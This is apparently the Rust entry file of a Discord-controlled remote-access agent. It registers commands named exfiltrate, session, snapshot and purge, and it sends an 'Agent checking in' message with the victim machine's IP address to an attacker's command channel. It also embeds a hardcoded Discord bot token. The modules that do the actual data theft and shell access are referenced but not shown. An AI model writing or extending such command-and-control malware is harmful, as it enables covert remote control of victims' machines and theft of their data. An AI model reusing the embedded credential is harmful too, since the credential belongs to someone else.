mod commands;
mod errors;
mod os;
mod utils;
mod libraries;
mod event_handler;

use crate::{
    utils::agent::*, commands::*, shell::*, misc::*, exfiltration::*,
    event_handler::MainHandler
};

use serenity::{client::Context, prelude::GatewayIntents, Client, model::{application::command::Command, id::GuildId}};

use anyhow::Error;

const GUILD_ID: GuildId = GuildId(1086423448454180905);
static TOKEN: &str = "MTA4NzQ2MzExMjY3ODA1NTkzNg.GTGs1y.Nj49dYvo8rSYUA1duIUgaC57UhbJs5fJyMKvhU";

async fn register_commands(ctx: &Context) -> Result<(), Error> {
    Command::create_global_application_command(&ctx.http, info::register).await?;
    Command::create_global_application_command(&ctx.http, purge::register).await?;
    Command::create_global_application_command(&ctx.http, exfiltrate::register).await?;
    Command::create_global_application_command(&ctx.http, session::register).await?;
    Command::create_global_application_command(&ctx.http, snapshot::register).await?;
    Ok(())
}

async fn send_agent_check_in(ctx: &Context) -> Result<(), Error> {
    let agent = get_or_create_agent(ctx).await;

    agent
        .get_command_channel()
        .send_message(ctx, |m| {
            m.content(format!("Agent checking in from {}", agent.get_ip_address()))
        })
        .await?;
    Ok(())
}

#[tokio::main]
async fn main() {
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT
        | GatewayIntents::GUILDS;

    let mut client = Client::builder(TOKEN, intents)
        .event_handler(MainHandler)
        .await
        .expect("Failed to create the client");

    // start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("An error occurred while running the client: {:?}", why);
    }
}
